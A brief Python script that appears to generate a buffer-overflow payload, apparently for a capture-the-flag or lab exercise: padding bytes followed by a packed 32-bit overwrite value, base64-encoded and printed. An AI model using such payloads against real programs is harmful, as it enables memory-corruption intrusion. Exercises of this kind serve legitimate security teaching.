
import sys
import struct
import base64

buf = b'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD'
buf += struct.pack('<I', 3126124142)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
